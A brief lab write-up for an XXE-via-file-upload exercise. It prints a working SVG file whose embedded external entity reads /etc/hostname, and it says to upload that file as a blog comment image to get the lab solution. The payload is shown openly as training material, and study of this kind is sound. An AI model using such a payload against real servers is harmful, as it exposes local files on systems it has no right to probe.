# XXE Via File Upload

Use the following payload that appears to be an svg image but contains XXE payload:

```XML
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Save it into a file and upload it into the blog comment:

![[XXE/Labs/XXE Via File Upload/images/payload.png]]

Finally check the comment image to obtain the lab solution:

![[img.png]]

![[XXE/Labs/XXE Via File Upload/images/exploited.png]]


de16a00eb7f8

